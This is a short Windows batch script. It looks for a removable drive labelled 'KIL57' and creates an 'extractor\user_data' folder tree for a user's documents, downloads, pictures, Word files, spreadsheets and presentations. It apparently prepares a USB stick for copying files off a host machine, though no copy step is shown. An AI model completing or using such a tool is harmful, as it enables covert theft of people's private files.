@ECHO OF
FOR %%a in ( d e f g h i j k l m n o p q r s t u v w x y z) do vol %%a: 2>nul |find "KIL57" >nul && set drv=%%a:
echo. %drv%
md %drv%\extractor\user_data
md %drv%\extractor\user_data\user 
md %drv%\extractor\user_data\user\documents
md %drv%\extractor\user_data\user\downloads
md %drv%\extractor\user_data\user\documents\docs_from_user 
md %drv%\extractor\user_data\user\downloads\docs_inside_downloads_from_user 
md %drv%\extractor\user_data\user\documents\pics_from_user 
md %drv%\extractor\user_data\user\downloads\pics_inside_downloads_from_user
md %drv%\extractor\user_data\user\dirs
md %drv%\extractor\user_data\user\documents\word_docs_from_user 
md %drv%\extractor\user_data\user\downloads\word_docs_inside_downloads_from_user
md %drv%\extractor\user_data\user\documents\spreadsheets_from_documents
md %drv%\extractor\user_data\user\downloads\spreadsheets_from_downloads_folder
md %drv%\extractor\user_data\user\documents\text_files_from_documents
md %drv%\extractor\user_data\user\documents\presentations_from_documents
md %drv%\extractor\user_data\user\downloads\presentation_from_downaloads_folder
